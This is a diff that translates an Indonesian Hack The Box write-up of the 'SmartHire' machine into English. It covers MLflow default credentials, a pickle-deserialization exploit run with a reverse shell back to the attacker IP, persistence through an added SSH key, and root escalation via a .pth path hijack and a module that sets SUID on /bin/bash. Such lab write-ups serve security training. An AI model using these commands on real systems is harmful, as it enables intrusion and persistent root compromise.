@@ -3,66 +3,66 @@
 **Platform:** Hack The Box  
 **Difficulty:** Medium (estimated)  
 **OS:** Linux (Ubuntu)  
-**IP Mesin:** 10.129.8.90  
-**IP Attacker:** 10.10.14.250  
+**Target IP:** 10.129.8.90  
+**Attacker IP:** 10.10.14.250  
 
 ---
 
-## Daftar Isi
+## Table of Contents
 
-- [Deskripsi Mesin](#deskripsi-mesin)
-- [Arsitektur](#arsitektur)
-- [Enumerasi Awal](#enumerasi-awal)
+- [Machine Description](#machine-description)
+- [Architecture](#architecture)
+- [Initial Enumeration](#initial-enumeration)
   - [Nmap Scan](#nmap-scan)
-  - [Penemuan Subdomain](#penemuan-subdomain)
+  - [Subdomain Discovery](#subdomain-discovery)
   - [CVE-2026-2635 — MLflow Default Credentials](#cve-2026-2635--mlflow-default-credentials)
-- [Enumerasi Lanjutan](#enumerasi-lanjutan)
-  - [Identifikasi Versi MLflow](#identifikasi-versi-mlflow)
-- [Eksploitasi Awal — Initial Foothold](#eksploitasi-awal--initial-foothold)
+- [Further Enumeration](#further-enumeration)
+  - [Identifying the MLflow Version](#identifying-the-mlflow-version)
+- [Initial Exploitation — Foothold](#initial-exploitation--foothold)
   - [CVE-2024-37054 — MLflow RCE via Pickle Deserialization](#cve-2024-37054--mlflow-rce-via-pickle-deserialization)
-  - [Reverse Shell ke User svcweb](#reverse-shell-ke-user-svcweb)
-  - [Memperkuat Akses via SSH Key](#memperkuat-akses-via-ssh-key)
+  - [Reverse Shell to User svcweb](#reverse-shell-to-user-svcweb)
+  - [Strengthening Access via SSH Key](#strengthening-access-via-ssh-key)
   - [User Flag](#user-flag)
-- [Privilege Escalation ke Root](#privilege-escalation-ke-root)
-  - [Sudo -l](#sudo--l)
-  - [Analisis Script mlflowctl.py](#analisis-script-mlflowctlpy)
-  - [Eksploitasi — Python Path Hijacking via .pth File](#eksploitasi--python-path-hijacking-via-pth-file)
+- [Privilege Escalation to Root](#privilege-escalation-to-root)
+  - [sudo -l](#sudo--l)
+  - [Analyzing the mlflowctl.py Script](#analyzing-the-mlflowctlpy-script)
+  - [Exploitation — Python Path Hijacking via .pth File](#exploitation--python-path-hijacking-via-pth-file)
   - [Root Flag](#root-flag)
-- [Ringkasan Serangan](#ringkasan-serangan)
-- [Tools yang Digunakan](#tools-yang-digunakan)
-- [Referensi](#referensi)
+- [Attack Summary](#attack-summary)
+- [Tools Used](#tools-used)
+- [References](#references)
 
 ---
 
-## Deskripsi Mesin
+## Machine Description
 
-SmartHire adalah mesin Linux berbasis HackTheBox yang mensimulasikan aplikasi web rekrutmen bertenaga machine learning. Mesin ini mencakup dua kerentanan utama: kredensial default yang ter-hardcode pada dashboard MLflow (CVE-2026-2635), dan kerentanan Remote Code Execution melalui deserialisasi pickle pada MLflow (CVE-2024-37054). Setelah mendapatkan akses awal sebagai user `svcweb`, privilege escalation ke root dilakukan melalui teknik Python path hijacking dengan memanfaatkan konfigurasi `sudo` yang salah.
+SmartHire is a Hack The Box Linux machine that simulates a machine learning–powered recruitment web application. The machine contains two main vulnerabilities: hardcoded default credentials on the MLflow dashboard (CVE-2026-2635) and a Remote Code Execution vulnerability through pickle deserialization in MLflow (CVE-2024-37054). After gaining initial access as the `svcweb` user, privilege escalation to root is performed using a Python path hijacking technique that abuses a misconfigured `sudo` rule.
 
 ---
 
-## Arsitektur
+## Architecture
 
-| Komponen | Detail |
+| Component | Details |
 |---|---|
 | Web Server | nginx/1.18.0 |
 | OS | Ubuntu Linux |
-| Port Terbuka | 22 (SSH), 80 (HTTP) |
-| Aplikasi Utama | `smarthire.htb` |
+| Open Ports | 22 (SSH), 80 (HTTP) |
+| Main Application | `smarthire.htb` |
 | Subdomain | `models.smarthire.htb` (MLflow Dashboard) |
 
 ---
 
-## Enumerasi Awal
+## Initial Enumeration
 
 ### Nmap Scan
 
-Scan dilakukan menggunakan Nmap dengan opsi lengkap untuk deteksi versi, OS, dan script enumeration.
+A full Nmap scan was performed with version detection, OS detection, and enumeration scripts.
 
 ```bash
 nmap --privileged -sV --script http-enum -T4 -oN nmap.txt -sC -A -O -p- 10.129.8.90
 ```
 
-Hasil scan menunjukkan hanya dua port yang terbuka:
+The scan results showed only two open ports:
 
 ```
 PORT   STATE SERVICE VERSION
@@ -72,23 +72,23 @@ PORT   STATE SERVICE VERSION
 
 ![Nmap Scan](IMG/ENUMERASI-AWAL_NMAP.png)
 
-Permukaan serangan terbatas pada port 80 (HTTP), sehingga enumerasi difokuskan pada web application.
+The attack surface is limited to port 80 (HTTP), so enumeration focused on the web application.
 
 ---
 
-### Penemuan Subdomain
+### Subdomain Discovery
 
-Enumerasi subdomain dilakukan terhadap domain utama `smarthire.htb`. Ditemukan sebuah subdomain bernama `models.smarthire.htb`.
+Subdomain enumeration was performed against the main domain `smarthire.htb`. A subdomain named `models.smarthire.htb` was discovered.
 
-![Domain Utama](IMG/DOMAIN.png)
+![Main Domain](IMG/DOMAIN.png)
 
-![Subdomain models Ditemukan](IMG/ENUMERASI-AWAL_SUBDOMAIN-MODELS-DIDAPATKAN.png)
+![models Subdomain Discovered](IMG/ENUMERASI-AWAL_SUBDOMAIN-MODELS-DIDAPATKAN.png)
 
-Saat diakses, subdomain `models.smarthire.htb` meminta kredensial HTTP Basic Authentication, yang mengindikasikan adanya layanan internal yang dilindungi.
+When accessed, the `models.smarthire.htb` subdomain prompted for HTTP Basic Authentication credentials, indicating a protected internal service.
 
-![Akses Subdomain models Meminta Kredensial](IMG/ENUMERASI-AWAL_MENCOBA-AKSES-SUBDOMAIN-MODELS.png)
+![Accessing models Subdomain Requires Credentials](IMG/ENUMERASI-AWAL_MENCOBA-AKSES-SUBDOMAIN-MODELS.png)
 
-Tambahkan kedua domain ke `/etc/hosts`:
+Add both domains to `/etc/hosts`:
 
 ```bash
 echo "10.129.8.90 smarthire.htb models.smarthire.htb" | sudo tee -a /etc/hosts
@@ -98,88 +98,88 @@ echo "10.129.8.90 smarthire.htb models.smarthire.htb" | sudo tee -a /etc/hosts
 
 ### CVE-2026-2635 — MLflow Default Credentials
 
-Subdomain `models.smarthire.htb` menjalankan MLflow. Berdasarkan CVE-2026-2635, ditemukan bahwa aplikasi ini menggunakan kredensial default yang ter-hardcode langsung di dalam source code (hardcoded credentials).
+The `models.smarthire.htb` subdomain runs MLflow. Based on CVE-2026-2635, it was found that the application uses hardcoded default credentials embedded directly in the source code.
 
-**Kredensial yang dicoba:**
+**Credentials attempted:**
 
 | Username | Password |
 |---|---|
 | admin | password |
 | admin | password1234 |
 
-Kombinasi `admin:password` berhasil memberikan akses masuk ke dashboard MLflow.
+The combination `admin:password` successfully granted access to the MLflow dashboard.
 
-![Dashboard mlflow](IMG/ENUMERASI-AWAL_DASHBOARD-MLFLOW.png)
+![MLflow Dashboard](IMG/ENUMERASI-AWAL_DASHBOARD-MLFLOW.png)
 
 ---
 
-## Enumerasi Lanjutan
+## Further Enumeration
 
-### Identifikasi Versi MLflow
+### Identifying the MLflow Version
 
-Setelah berhasil masuk ke dashboard MLflow, dilakukan identifikasi versi untuk mencari kerentanan yang dapat dieksploitasi lebih lanjut.
+After successfully logging into the MLflow dashboard, the version was identified to search for further exploitable vulnerabilities.
 
 ![CVE-2026-2635 Detail 1](IMG/ENUMERASI-TENGAH_CVE-2026-2635[1].png)
 
 ![CVE-2026-2635 Detail 2](IMG/ENUMERASI-TENGAH_CVE-2026-2635[2].png)
 
-Versi MLflow yang digunakan berhasil diidentifikasi.
+The MLflow version in use was successfully identified.
 
-![Versi MLflow Didapat](IMG/ENUMERASI-TENGAH_VERSI-MLFLOW-DIDAPAT.png)
+![MLflow Version Identified](IMG/ENUMERASI-TENGAH_VERSI-MLFLOW-DIDAPAT.png)
 
-Versi tersebut rentan terhadap **CVE-2024-37054**, yaitu kerentanan Remote Code Execution melalui deserialisasi `pickle` yang tidak aman saat model dimuat.
+That version is vulnerable to **CVE-2024-37054**, a Remote Code Execution vulnerability through insecure `pickle` deserialization when loading models.
 
 ---
 
-## Eksploitasi Awal — Initial Foothold
+## Initial Exploitation — Foothold
 
 ### CVE-2024-37054 — MLflow RCE via Pickle Deserialization
 
-MLflow memuat model menggunakan `pickle`, yang memungkinkan eksekusi kode arbitrer apabila penyerang dapat mengganti file model (`python_model.pkl`) dengan payload berbahaya. Alur eksploitasi adalah sebagai berikut:
+MLflow loads models using `pickle`, which allows arbitrary code execution if an attacker can replace the model file (`python_model.pkl`) with a malicious payload. The exploitation flow is as follows:
 
-1. Daftarkan akun baru di `smarthire.htb` dan login untuk mendapatkan session cookie.
-2. Upload file CSV training dummy untuk memicu pipeline pelatihan model dan mendaftarkan model ke MLflow.
-3. Ambil `run_id` dari model yang baru terdaftar melalui MLflow API.
-4. Bangun payload pickle berbahaya yang berisi reverse shell.
-5. Timpa file `python_model.pkl` milik model tersebut melalui MLflow Artifacts API.
-6. Panggil endpoint `/predict` pada aplikasi utama untuk memicu pemuatan model dan mengeksekusi payload.
+1. Register a new account at `smarthire.htb` and log in to obtain a session cookie.
+2. Upload a dummy training CSV file to trigger the model training pipeline and register a model to MLflow.
+3. Retrieve the `run_id` of the newly registered model via the MLflow API.
+4. Build a malicious pickle payload containing a reverse shell.
+5. Overwrite the model's `python_model.pkl` file via the MLflow Artifacts API.
+6. Call the `/predict` endpoint on the main application to trigger model loading and execute the payload.
 
-Script eksploitasi lengkap (`shell.py`) tersedia di direktori `SKRIP/`.
+The complete exploit script (`shell.py`) is available in the `SKRIP/` directory.
 
-**Jalankan listener terlebih dahulu:**
+**Start the listener first:**
 
 ```bash
 nc -lvnp 4444
 ```
 
-**Jalankan exploit:**
+**Run the exploit:**
 
 ```bash
-# Otomatis (daftar akun baru dan eksploitasi):
+# Automatic (register a new account and exploit):
 python3 SKRIP/shell.py --lhost 10.10.14.250 --lport 4444 --atoz
 
-# Manual (gunakan session yang sudah ada):
+# Manual (use an existing session):
 python3 SKRIP/shell.py --lhost 10.10.14.250 --lport 4444 --atoz
 ```
 *(https://github.com/jimmexploit/CVE-2024-37054-PoC.git)*
 
 ---
 
-### Reverse Shell ke User svcweb
+### Reverse Shell to User svcweb
 
-Setelah exploit berhasil dijalankan, reverse shell diterima sebagai user `svcweb`.
+After the exploit ran successfully, a reverse shell was received as the `svcweb` user.
 
-![Reverse Shell Berhasil 1](IMG/EKSPLOIT-BIASA_REVERSE_SHELL_SVCWEB[1].png)
+![Reverse Shell Success 1](IMG/EKSPLOIT-BIASA_REVERSE_SHELL_SVCWEB[1].png)
 
-![Reverse Shell Berhasil 2](IMG/EKSPLOIT-BIASA_REVERSE_SHELL_SVCWEB[2].png)
+![Reverse Shell Success 2](IMG/EKSPLOIT-BIASA_REVERSE_SHELL_SVCWEB[2].png)
 
 ---
 
-### Memperkuat Akses via SSH Key
+### Strengthening Access via SSH Key
 
-Untuk mendapatkan akses yang lebih stabil dan persisten, dibuat SSH key pair di mesin penyerang, kemudian public key di-upload ke `~/.ssh/authorized_keys` milik user `svcweb`.
+To obtain a more stable and persistent shell, an SSH key pair was generated on the attacker machine, then the public key was uploaded to the `svcweb` user's `~/.ssh/authorized_keys`.
 
-**Di mesin penyerang:**
+**On the attacker machine:**
 
 ```bash
 ssh-keygen -t ed25519 -C "SSH to svcweb" -f svcweb_key
@@ -187,15 +187,15 @@ ssh-keygen -t ed25519 -C "SSH to svcweb" -f svcweb_key
 
 ![SSH Key Upload](IMG/EKSPLOIT-BIASA_SSH_KEY_SVCWEB.png)
 
-**Di shell reverse (sebagai svcweb):**
+**In the reverse shell (as svcweb):**
 
 ```bash
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOcZY+Xp/GQQdab+nwvkwd7+LP00nORDXRDFU3sZ7i9B SSH to svcweb" >> ~/.ssh/authorized_keys
 ```
 
-![SSH Key Berhasil](IMG/EKSPLOIT-BIASA_SSH_KEY_SVCWEB[2].png)
+![SSH Key Success](IMG/EKSPLOIT-BIASA_SSH_KEY_SVCWEB[2].png)
 
-**Login via SSH:**
+**Log in via SSH:**
 
 ```bash
 ssh -i svcweb_key svcweb@smarthire.htb
@@ -205,25 +205,25 @@ ssh -i svcweb_key svcweb@smarthire.htb
 
 ### User Flag
 
-Setelah mendapatkan akses SSH yang stabil sebagai `svcweb`, user flag berhasil diperoleh.
+After obtaining a stable SSH session as `svcweb`, the user flag was retrieved.
 
 ![User Flag](IMG/SVCWEB-USER-FLAG.png)
 
 ---
 
-## Privilege Escalation ke Root
+## Privilege Escalation to Root
 
-### Sudo -l
+### sudo -l
 
-Pemeriksaan hak sudo dilakukan untuk melihat apakah user `svcweb` memiliki privilege tambahan.
+The sudo privileges were checked to see whether the `svcweb` user had any additional privileges.
 
 ```bash
 sudo -l
 ```
 
-![Sudo -l](IMG/PRIV-ESCAL-TO-ROOT_SUDO-L.png)
+![sudo -l](IMG/PRIV-ESCAL-TO-ROOT_SUDO-L.png)
 
-Ditemukan bahwa `svcweb` dapat menjalankan script Python tertentu sebagai root tanpa password:
+It was found that `svcweb` could run a specific Python script as root without a password:
 
 ```
 (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
@@ -231,36 +231,36 @@ Ditemukan bahwa `svcweb` dapat menjalankan script Python tertentu sebagai root t
 
 ---
 
-### Analisis Script mlflowctl.py
+### Analyzing the mlflowctl.py Script
 
-Script `mlflowctl.py` dianalisis untuk memahami alur import modul yang digunakan. Ditemukan bahwa script tersebut melakukan import modul custom bernama `mlflow_actions` dari direktori `plugins`.
+The `mlflowctl.py` script was analyzed to understand its module import flow. It was found that the script imports a custom module named `mlflow_actions` from the `plugins` directory.
 
-Terdapat dua direktori yang relevan:
+There are two relevant directories:
 
-- `/opt/tools/mlflow_ctl/core/` — direktori utama (tidak writeable)
-- `/opt/tools/mlflow_ctl/dev/` — direktori development (writeable)
+- `/opt/tools/mlflow_ctl/core/` — main directory (not writable)
+- `/opt/tools/mlflow_ctl/dev/` — development directory (writable)
 
-![Dir Dev Writeable](IMG/PRIV-ESCAL-TO-ROOT_DIR-DEV-WRITEABLE.png)
+![Dev Directory Writable](IMG/PRIV-ESCAL-TO-ROOT_DIR-DEV-WRITEABLE.png)
 
-![Dir Module Import](IMG/PRIV-ESCAL-TO-ROOT_DIR-MODULE-IMPORT.png)
+![Module Import Directory](IMG/PRIV-ESCAL-TO-ROOT_DIR-MODULE-IMPORT.png)
 
-Script mengandung kerentanan logic error: path direktori `dev` dapat disisipkan ke Python sys.path sehingga modul dari direktori tersebut diprioritaskan saat import.
+The script contains a logic error vulnerability: the `dev` directory path can be inserted into Python's sys.path so that modules from that directory take priority during import.
 
 ---
 
-### Eksploitasi — Python Path Hijacking via .pth File
+### Exploitation — Python Path Hijacking via .pth File
 
-Teknik eksploitasi memanfaatkan file `.pth` untuk memanipulasi `sys.path` Python agar direktori `dev` (yang writeable) digunakan sebagai sumber import modul, menggantikan modul legitimate `mlflow_actions`.
+The exploitation technique abuses `.pth` files to manipulate Python's `sys.path` so that the writable `dev` directory is used as the module import source, replacing the legitimate `mlflow_actions` module.
 
-**Langkah 1 — Buat file `.pth` untuk inject path:**
+**Step 1 — Create a `.pth` file to inject the path:**
 
 ```bash
 echo "/opt/tools/mlflow_ctl/dev" > /usr/lib/python3.10/evil.pth
 ```
 
-![File .pth untuk Eksploit](IMG/PRIV-ESCAL-TO-ROOT_FILE-PTH-FOR-EKSPLOIT.png)
+![.pth File for Exploitation](IMG/PRIV-ESCAL-TO-ROOT_FILE-PTH-FOR-EKSPLOIT.png)
 
-**Langkah 2 — Buat modul `mlflow_actions.py` berbahaya di direktori `dev`:**
+**Step 2 — Create a malicious `mlflow_actions.py` module in the `dev` directory:**
 
 ```python
 import os
@@ -272,21 +272,21 @@ def restart():
     os.system("chmod +s /bin/bash")
 ```
 
-![MLflow Actions Custom](IMG/PRIV-ESCAL-TO-ROOT_MLFLOW-ACTIONS-CUSTOM-FOR-MODULE-INJECT.png)
+![Custom MLflow Actions](IMG/PRIV-ESCAL-TO-ROOT_MLFLOW-ACTIONS-CUSTOM-FOR-MODULE-INJECT.png)
 
-**Langkah 3 — Jalankan script dengan sudo dan membaca root flag:**
+**Step 3 — Run the script with sudo and read the root flag:**
 
 ```bash
 sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
 ```
 
-Saat dijalankan, script secara otomatis mengimport modul `mlflow_actions` dari direktori `dev`, yang memicu eksekusi `/bin/bash -p` dengan privilege root.
+When executed, the script automatically imports the `mlflow_actions` module from the `dev` directory, which triggers the execution of `/bin/bash -p` with root privileges.
 
-![Eksploitasi PrivEsc dan Root Flag](IMG/EKSPLOITASI-PRIVESCAL-DAN-ROOT-FLAG.png)
+![PrivEsc Exploitation and Root Flag](IMG/EKSPLOITASI-PRIVESCAL-DAN-ROOT-FLAG.png)
 
 ---
 
-## Ringkasan Serangan
+## Attack Summary
 
 ```
 [Attacker]
@@ -307,7 +307,7 @@ Saat dijalankan, script secara otomatis mengimport modul `mlflow_actions` dari d
     | 6. sudo -l -> NOPASSWD: python3.10 mlflowctl.py
     |
     | 7. Python Path Hijacking via .pth file
-    |       - Writeable /dev directory
+    |       - Writable /dev directory
     |       - Inject malicious mlflow_actions.py
     |       - sudo python3.10 mlflowctl.py status -> /bin/bash -p
     |
@@ -318,24 +318,25 @@ Saat dijalankan, script secara otomatis mengimport modul `mlflow_actions` dari d
 
 ---
 
-## Tools yang Digunakan
+## Tools Used
 
-| Tool | Kegunaan |
+| Tool | Purpose |
 |---|---|
-| Nmap | Port scanning dan service enumeration |
-| curl / browser | Enumerasi web dan subdomain |
-| cloudpickle | Membuat payload pickle berbahaya |
-| Python 3 | Menjalankan exploit script |
-| Netcat (nc) | Menerima reverse shell |
-| ssh-keygen | Membuat SSH key pair |
-| SSH | Akses persisten sebagai svcweb |
+| Nmap | Port scanning and service enumeration |
+| curl / browser | Web and subdomain enumeration |
+| cloudpickle | Creating malicious pickle payloads |
+| Python 3 | Running the exploit script |
+| Netcat (nc) | Catching the reverse shell |
+| ssh-keygen | Generating SSH key pairs |
+| SSH | Persistent access as svcweb |
 
 ---
 
-## Referensi
+## References
 
 - [CVE-2024-37054 — MLflow Pickle Deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-37054)
 - [CVE-2026-2635 — MLflow Hardcoded Credentials](https://nvd.nist.gov/vuln/detail/CVE-2026-2635)
 - [MLflow Security Advisories](https://mlflow.org/docs/latest/security.html)
 - [Python .pth File Path Injection](https://docs.python.org/3/library/site.html)
-- [HackTheBox](https://www.hackthebox.com)
+- [Hack The Box](https://www.hackthebox.com)
+          
